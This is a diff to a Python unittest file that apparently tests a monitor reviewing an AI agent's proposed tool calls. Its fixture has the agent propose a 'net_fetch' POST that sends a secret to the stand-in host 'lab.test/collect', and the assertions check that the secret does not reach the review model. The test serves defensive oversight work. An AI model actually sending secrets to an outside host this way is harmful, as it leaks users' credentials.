@@ -122,7 +122,7 @@ class StageFTests(unittest.TestCase):
     args={'url':'http://lab.test/collect','method':'POST','body':secret}
     core.observe({'event_id':'p','type':'assistant_turn','proposals':[{'call_id':'x','tool':'net_fetch','args':args}]})
     class Response:
-     def __init__(self,answer):self.answer=answer
+     def __init__(self,answer):self.answer=answer;self.status_code=200
      def raise_for_status(self):pass
      def json(self):return {'choices':[{'message':{'content':json.dumps(self.answer,ensure_ascii=False)}}]}
     def post(url,headers,json):
@@ -136,7 +136,7 @@ class StageFTests(unittest.TestCase):
      result=core.decide('net_fetch',args,{'call_id':'x'})
      before=core.store.db.execute("SELECT decision FROM calls WHERE id='x'").fetchone()[0]
      core.drain(4)
-    self.assertEqual(len(submitted),1);self.assertNotIn(secret,json.dumps(submitted))
+    self.assertEqual(len(submitted),2 if bad_ref else 1);self.assertNotIn(secret,json.dumps(submitted))
     self.assertEqual(core.store.db.execute("SELECT decision FROM calls WHERE id='x'").fetchone()[0],before)
     review=next(x for x in logs if x.get('type')=='slow_review')
     self.assertEqual(review['attribution_status'],'template_fallback' if bad_ref else 'model_assessed')
